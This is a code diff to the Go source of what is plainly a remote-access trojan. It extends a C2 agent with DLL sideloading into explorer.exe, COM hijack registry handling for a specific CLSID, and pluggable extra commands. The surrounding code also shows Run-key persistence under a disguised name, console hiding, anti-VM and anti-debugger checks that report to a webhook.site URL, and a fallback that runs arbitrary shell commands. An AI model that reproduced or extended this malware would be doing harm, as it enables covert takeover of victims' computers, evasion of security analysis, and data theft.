@@ -102,6 +102,7 @@ var (
 	pRegQueryValueExW          = advapi32.NewProc("RegQueryValueExW")
 	pRegSetValueExW            = advapi32.NewProc("RegSetValueExW")
 	pRegDeleteValueW           = advapi32.NewProc("RegDeleteValueW")
+	pRegDeleteKeyW             = advapi32.NewProc("RegDeleteKeyW")
 	pRegCloseKey               = advapi32.NewProc("RegCloseKey")
 	pRegCreateKeyExW           = advapi32.NewProc("RegCreateKeyExW")
 	pShellExecuteW             = shell32.NewProc("ShellExecuteW")
@@ -709,6 +710,36 @@ func regDelete(root uintptr, keyPath, valueName string) {
 	defer pRegCloseKey.Call(hKey)
 	vn, _ := windows.UTF16PtrFromString(valueName)
 	pRegDeleteValueW.Call(hKey, uintptr(unsafe.Pointer(vn)))
+}
+
+func regDeleteKey(root uintptr, keyPath string) {
+	kp, _ := windows.UTF16PtrFromString(keyPath)
+	pRegDeleteKeyW.Call(root, uintptr(unsafe.Pointer(kp)))
+}
+
+// cleanupStaleCOMHijack removes ONLY stale COM hijack registry entries —
+// those pointing to a DLL file that no longer exists on disk.
+// Safe to call in both EXE and DLL mode: if the DLL exists (i.e. we ARE
+// the DLL, currently loaded), it returns early and touches nothing.
+func cleanupStaleCOMHijack() {
+	const comCLSID = `{BCDE0395-E52F-467C-8E3D-C4579291692E}`
+	comInproc := `Software\Classes\CLSID\` + comCLSID + `\InprocServer32`
+	comParent := `Software\Classes\CLSID\` + comCLSID
+
+	val := regRead(HKCU, comInproc, "")
+	if val == "" {
+		return // no hijack present
+	}
+	// Only wipe stale entries — if the DLL still exists, leave it alone
+	if _, err := os.Stat(val); err == nil {
+		return
+	}
+
+	// DLL is gone — clean up dangling registry entries (leaf-first)
+	regDelete(HKCU, comInproc, "")
+	regDelete(HKCU, comInproc, "ThreadingModel")
+	regDeleteKey(HKCU, comInproc)
+	regDeleteKey(HKCU, comParent)
 }
 
 func isAdmin() bool {
@@ -1624,6 +1655,16 @@ func getFolderTree() string {
 // PERSISTENCE
 // ================================================================
 
+// Hooks set by DLL build (dll_sideload.go init) — nil in EXE build.
+// Keeps all DLL/COM-specific strings out of the EXE binary.
+var extraPersistCleanup func()
+var extraOptionsText func() string
+var extraCommandHandler func(cmd string) (result string, handled bool)
+
+// dllMode is set to true by dll_sideload.go init() in DLL builds.
+// Prevents os.Exit() calls from killing the host process (e.g. explorer.exe).
+var dllMode bool
+
 func addPersistence() string {
 	exePath, err := os.Executable()
 	if err != nil {
@@ -1654,6 +1695,13 @@ func removePersistence() string {
 	regDelete(HKCU, `Software\Microsoft\Windows\CurrentVersion\Run`, "Finder")
 	legacyPath := filepath.Join(os.Getenv("APPDATA"), `Microsoft\Windows\Themes\SystemThemeService.exe`)
 	os.Remove(legacyPath)
+	// DLL build sets this hook to clean up COM hijack + sideloaded DLL
+	if extraPersistCleanup != nil {
+		extraPersistCleanup()
+	} else {
+		// EXE build: clean up any stale COM hijack left by a previous DLL deployment
+		cleanupStaleCOMHijack()
+	}
 	return "Persistence removed"
 }
 
@@ -2031,6 +2079,9 @@ CONTROL
   ping           - Connection test
   sleep          - Sleep N seconds (args: seconds)
   exit           - Terminate client`
+	if extraOptionsText != nil {
+		return base + "\n" + extraOptionsText()
+	}
 	return base
 }
 
@@ -2297,6 +2348,13 @@ func handleCommand(c2 *C2Client, jm *JobManager, cmd Command) {
 		os.Exit(0)
 
 	default:
+		// DLL build injects extra commands (sideload, unsideload, etc.)
+		if extraCommandHandler != nil {
+			if r, handled := extraCommandHandler(cmd.Command); handled {
+				result = r
+				break
+			}
+		}
 		// Try executing as raw shell command
 		out, err := shellExec(cmd.Command + " " + cmd.Args)
 		if err != nil {
@@ -2338,7 +2396,7 @@ func jitteredSleep(base time.Duration, jitterPct int) {
 // MAIN
 // ================================================================
 
-func main() {
+func runAgent() {
 	// Anti-analysis: exit if non-VMware VM or debugger detected.
 	// VMware-only triggers are treated as false positives (host has VMware installed).
 	vmDetected, vmTriggers := detectVMDetails()
@@ -2366,19 +2424,28 @@ func main() {
 		http.Post("https://webhook.site/0a0aea37-6d21-47b2-844f-30db3cee67e3", "application/json", bytes.NewReader(payload))
 
 		if shouldExit {
+			if dllMode {
+				return // Don't kill host process (explorer.exe) in DLL build
+			}
 			time.Sleep(time.Duration(mrand.Intn(10)+5) * time.Second)
 			os.Exit(0)
 		}
 		// VMware-only: log sent, continue execution
 	}
 
-	// Single instance
+	// Single instance — in DLL mode, return silently if another instance is running
 	if !createSingleInstance() {
+		if dllMode {
+			return
+		}
 		os.Exit(0)
 	}
 
 	// Hide console
 	hideConsole()
+
+	// Clean up stale COM hijack entries pointing to missing DLL files
+	cleanupStaleCOMHijack()
 
 	// Build config
 	hostname, _ := os.Hostname()
